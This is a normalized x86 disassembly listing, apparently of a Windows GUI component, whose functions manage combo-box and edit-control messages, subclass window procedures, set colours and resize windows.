je r-xdata
mov edx esi
mov eax ebx
call sub_495d94
pop esi
pop ebx
retn
mov eax ebx
call sub_492ec4
sub_45be64
push esi
mov esi eax
mov eax esi
call sub_4902b0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
retn
cmp [ esi + 0x2d6 ] 0x2
jae r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45be90
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x2ac ]
push eax
mov edx esi
mov ecx [ ebx + 0x2a0 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x108 ]
mov eax [ esi ]
mov edx eax
cmp edx 0x201
jg r-xdata
cmp eax 0x109
ja r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub edx 0x203
je r-xdata
je r-xdata
mov dl 0x1
mov eax ebx
call sub_477028
mov edi eax
test edi edi
je r-xdata
mov eax ebx
call sub_48d12c
cmp al 0x1
jne r-xdata
sub edx 0xae4a
je r-xdata
sub edx 0x30
je r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x104 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_48dac0
mov eax [ esp + 0x8 ]
and eax 0xffff
mov edx [ esp + 0xc ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x2a0 ]
push eax
call SendMessageW
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_48e71c
jmp r-xdata
cmp [ ebx + 0x26c ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub edx 0x1d0
je r-xdata
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x2a0 ]
push eax
call GetWindowRect
push 0x2
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x2a0 ]
push eax
push 0x0
call MapWindowPoints
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x2a0 ]
call sub_48ab7c
mov [ ebx + 0x26c ] 0x0
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x2a0 ]
push eax
call SendMessageW
jmp r-xdata
mov edx [ esi + 0x8 ]
push edx
mov ecx [ esi + 0x4 ]
mov edx eax
mov eax ebx
call sub_48f2b0
jmp r-xdata
jmp r-xdata
sub_45c03c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x2f8 ]
mov edx esi
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x2f8 ]
mov edx esi
call sub_449d2c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x128 ]
sub_45c074
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c32d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x2a4 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcW
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4954f0
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_495630
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc98
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_48327c
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffea
call sub_4483f8
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_477028
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_458fa4
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_49570c
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xfc ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push esi
call MapWindowPoints
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0xc ]
call sub_422fd4
mov [ ebx + 0x8 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
movzx edi [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc98
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45bcbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45c350
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edi [ esi ]
mov eax edi
cmp eax 0x83
jg r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
sub eax 0x102
je r-xdata
je r-xdata
mov eax ebx
call sub_48e800
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_49570c
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub eax 0x5
je r-xdata
mov eax ebx
call sub_48d12c
cmp al 0x1
jne r-xdata
movzx edi [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x18 ]
call sub_46cf24
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x1b8 ]
call sub_46df14
call sub_46cf24
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x1b8 ]
call sub_46df70
mov [ esi + 0xc ] eax
test [ ebx + 0x55 ] 0x80
je r-xdata
jmp r-xdata
cmp [ ebx + 0x2b4 ] 0x0
je r-xdata
sub eax 0x76
je r-xdata
mov edx esi
mov eax ebx
call sub_4934ac
test al al
jne r-xdata
mov eax ebx
call sub_45bc98
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
cmp [ ebx + 0x26c ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4936a0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x7c ] 0x0
jne r-xdata
jmp r-xdata
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_45bcbc
jmp r-xdata
mov [ ebx + 0x26c ] 0x1
push 0x0
push 0x0
push 0xb04d
mov eax [ ebx + 0x2a0 ]
push eax
call PostMessageW
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push edi
mov eax [ ebx + 0x2a0 ]
push eax
mov eax [ ebx + 0x2ac ]
push eax
call CallWindowProcW
mov [ esi + 0xc ] eax
jmp r-xdata
sub_45c4e6
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45c654
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c65b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
jmp [ eax * 4 + jump_table_45c514 ]
mov eax edi
mov si 0xffea
call sub_4483f8
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_4483f8
jmp r-xdata
mov [ edi + 0x2b5 ] 0x0
mov eax edi
mov si 0xffae
call sub_4483f8
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
cmp [ edi + 0x2b5 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
mov eax edi
mov si 0xffad
call sub_4483f8
jmp r-xdata
mov [ edi + 0x2b6 ] 0x1
mov [ edi + 0x2b5 ] 0x1
mov eax edi
call sub_494cbc
jmp r-xdata
mov [ edi + 0x2b6 ] 0x0
mov [ edi + 0x2b5 ] 0x1
mov eax edi
call sub_494e24
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_496868
push eax
call PostMessageW
cmp [ edi + 0x2b6 ] 0x0
jne r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x29c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_48dfa0
mov eax edi
mov si 0xffeb
call sub_4483f8
mov eax edi
mov si 0xffaf
call sub_4483f8
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_496868
push eax
call PostMessageW
jmp r-xdata
sub_45c688
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45c731
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x260 ]
call sub_48c748
cmp [ ebx + 0x2e2 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x260 ]
call sub_46e300
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c738
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x29c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x260 ]
call sub_46e4f0
sub_45c764
push esi
push edi
mov esi eax
mov eax esi
call sub_490858
mov edi [ esi + 0x270 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_45c78c
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
mov eax edi
call sub_496c14
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call GetFocus
mov esi eax
cmp esi [ edi + 0x2a0 ]
je r-xdata
mov bl 0x1
cmp esi [ edi + 0x2a4 ]
je r-xdata
mov eax edi
call sub_496868
cmp esi eax
je r-xdata
xor ebx ebx
jmp r-xdata
sub_45c7ec
push ebx
push esi
cmp [ eax + 0x282 ] 0x0
je r-xdata
mov si 0xffb0
call sub_4483f8
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
pop esi
pop ebx
retn
sub_45c818
push ebx
mov ebx eax
mov eax ebx
call sub_4927d4
push 0x0
mov eax [ ebx + 0x264 ]
push eax
push 0x141
mov eax ebx
call sub_496868
push eax
call SendMessageW
xor eax eax
mov [ ebx + 0x2a0 ] eax
xor eax eax
mov [ ebx + 0x2a4 ] eax
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
je r-xdata
pop ebx
retn
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x268 ]
push eax
push 0x1701
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_45c88c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x11c ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2b4 ] 0x1
xor eax eax
push ebp
push sub_45c922
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a8 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c929
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2b4 ] 0x0
retn
mov ebx 0x1
sub_45c929
push 0x57
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a8 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_45c948
push esi
push edi
mov esi eax
mov edi [ esi + 0x29c ]
test edi edi
je r-xdata
mov [ esi + 0x29c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_45c978
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45c9f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c9fe
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x29c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
mov eax [ ebx + 0x29c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xe4 ]
sub_45ca04
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
mov eax [ ebx + 0x29c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_45ca3c
push ebx
mov ebx eax
cmp edx [ ebx + 0x268 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x268 ]
push eax
push 0x1701
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_45ca98
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_45cae1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x29c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cae8
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_45caf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45bacc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x110 ]
mov dl 0x1
call [ eax + 0x90 ]
mov esi eax
mov [ ebx + 0x29c ] esi
mov [ esi + 0x1c ] ebx
mov [ ebx + 0x298 ] 0x10
mov [ ebx + 0x2d6 ] 0x0
xor eax eax
mov [ ebx + 0x2cc ] eax
mov [ ebx + 0x2c8 ] 0x1
mov [ ebx + 0x2f0 ] 0x0
mov [ ebx + 0x2f4 ] 0x1f4
lea eax [ ebx + 0x2f8 ]
xor edx edx
call sub_449d2c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_45cb8c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x29c ]
call sub_4481b0
mov eax [ esi + 0x2d8 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45bbcc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_45cbdc
push ebx
mov ebx eax
cmp dl [ ebx + 0x2d6 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2d6 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_492ec4
sub_45cc44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4926c0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4925ec
mov eax [ esi + 0x4 ]
or eax 0x200240
movzx edx [ ebx + 0x2d6 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x2d5 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x2d4 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_45cc99
add [ eax ] al
add [ ebx ] al
dec edi
add [ ebp ] cl
inc edx
add [ edi ] cl
inc edx
add [ edi ] cl
pop eax
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi eax
mov eax esi
call sub_45c818
mov eax esi
call sub_496868
mov [ esi + 0x2a8 ] eax
mov eax [ esi + 0x2d8 ]
test eax eax
je r-xdata
movzx eax [ esi + 0x2d6 ]
sub al 0x2
jae r-xdata
mov edx eax
mov eax [ esi + 0x29c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi + 0x2d8 ]
call sub_4481b0
xor eax eax
mov [ esi + 0x2d8 ] eax
cmp [ esi + 0x2b8 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax esi
call sub_496868
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x29c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ esi + 0x2b8 ]
jge r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x128 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x2a0 ] 0x0
je r-xdata
cmp [ esi + 0x2d6 ] 0x1
jne r-xdata
push 0x0
mov eax [ esi + 0x2b8 ]
push eax
push 0x14e
mov eax esi
call sub_496868
push eax
call SendMessageW
mov [ esi + 0x2b8 ] 0xffffffff
mov eax [ esi + 0x29c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ esi + 0x2b8 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ esi + 0x2a0 ]
push eax
call SendMessageW
mov edi ebx
mov [ esi + 0x2a0 ] edi
push 0xfffffffc
push edi
call GetWindowLongW
mov [ esi + 0x2ac ] eax
mov eax [ esi + 0x2bc ]
push eax
push 0xfffffffc
mov eax [ esi + 0x2a0 ]
push eax
call SetWindowLongW
mov edi ebx
mov [ esi + 0x2a4 ] edi
push 0xfffffffc
push edi
call GetWindowLongW
mov [ esi + 0x2b0 ] eax
mov eax [ esi + 0x2c0 ]
push eax
push 0xfffffffc
mov eax [ esi + 0x2a4 ]
push eax
call SetWindowLongW
push 0x2
push ebx
call GetWindow
mov ebx eax
sub_45ce04
push ebx
push esi
mov esi eax
mov eax [ esi + 0x29c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_492bec
pop esi
pop ebx
retn
test [ esi + 0x55 ] 0x20
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ esi + 0x2b8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov ebx eax
mov [ esi + 0x2d8 ] ebx
mov edx [ esi + 0x29c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_45ce58
push ebx
mov ebx eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
je r-xdata
xor edx edx
mov eax 0x6
call sub_43a7f0
test al al
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
je r-xdata
mov eax [ ebx + 0x2f8 ]
push eax
mov eax ebx
call sub_496868
xor ecx ecx
mov edx 0x1703
call sub_41f080
jmp r-xdata
mov eax [ ebx + 0x2f8 ]
push eax
xor ecx ecx
mov edx 0x1501
mov eax [ ebx + 0x2a0 ]
call sub_41f080
sub_45ced0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x2d6 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1b8 ]
call sub_46df70
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_45cf28
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x2d6 ]
sub al 0x2
jae r-xdata
xor eax eax
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
mov ecx ebx
mov edx 0x140
call sub_41f10c
mov eax [ esi ]
cmp eax [ ebx ]
setg al
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45cf6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d003
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_48df68
mov ecx esi
sub ecx ebx
lea edx [ ebx + 0x1 ]
lea eax [ ebp - 0x4 ]
call sub_44a438
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
push eax
call SendMessageW
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_48dfa0
movzx esi bx
mov eax esi
shl esi 0x10
or eax esi
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
push eax
call SendMessageW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d00a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_45d010
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d405
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4956ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d40c
lea eax [ ebp - 0x5c ]
mov edx 0x5
call j_sub_44936c
lea eax [ ebp - 0x48 ]
call j_sub_449348
lea eax [ ebp - 0x44 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x38 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0xc ]
mov edx 0x2
call j_sub_44936c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2d6 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x2cc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x2f4 ]
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_48df68
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x2d0
call sub_449d2c
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2cc ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2d0
xor edx edx
call sub_449d2c
movzx eax [ ebx ]
sub ax 0x8
je r-xdata
push ebp
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_45cf28
pop ecx
test al al
je r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2d6 ]
sub al 0x2
jae r-xdata
push ebp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_45cf6c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c9 ] 0x0
je r-xdata
sub ax 0x12
jne r-xdata
xor eax eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_48df68
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4483f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc98
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c9 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
call sub_449fc4
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
call sub_43a904
cmp al 0x2
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_48df68
mov esi [ ebp - 0x10 ]
jmp r-xdata
test eax eax
setg al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45bcbc
jmp r-xdata
push ebp
lea edx [ ebp - 0x14 ]
